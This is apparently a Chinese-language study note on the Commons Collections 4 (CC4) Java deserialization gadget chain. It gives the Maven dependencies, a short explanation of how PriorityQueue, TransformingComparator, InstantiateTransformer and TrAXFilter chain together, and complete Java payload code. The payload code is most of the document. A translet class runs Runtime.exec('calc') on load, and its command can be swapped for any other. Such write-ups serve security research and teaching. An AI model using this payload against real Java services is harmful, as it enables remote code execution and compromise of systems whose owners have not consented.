##  环境搭建

JDK没有限制，需要CommonsCollections 4.0

```xml
 <dependency>
            <groupId>javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.12.1.GA</version>
        </dependency> <!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 -->
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.1</version>
        </dependency>
```

## 分析

其实没什么好分析的，就是CC3和CC2的结合

`PriorityQueue`的`readObject`触发`Comparator.compare`，然后调用`TransformingComparator`的`compare`方法，直接调用`transform`方法，我们通过`InstantiateTransformer`来实例化`TrAXFilter`类，从而触发`newTransformer`方法，可以加载恶意字节码。

##  payload

```java
package cc.cc4;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class payload {
    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception {
        Field field=obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception{
        ClassPool pool=ClassPool.getDefault();
        CtClass ctClass=pool.get(test.class.getName());
        TemplatesImpl templates=new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
        setFieldValue(templates, "_name", "z3eyond");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer[] trueTransformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates}
                )
        };
        Transformer chain= new ChainedTransformer(trueTransformers);
        Comparator comparator=new TransformingComparator(chain);
        PriorityQueue priority=new PriorityQueue(1,null);
        priority.add(1);
        priority.add(2);
        setFieldValue(priority,"comparator",comparator);
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos= new ObjectOutputStream(baos);
        oos.writeObject(priority);
        ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
    }
}


```

test类：

```java
package cc.cc4;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;


public class  test extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public test() throws Exception {
        super();
        Runtime.getRuntime().exec("calc");
        System.out.println(123);
    }
}

```

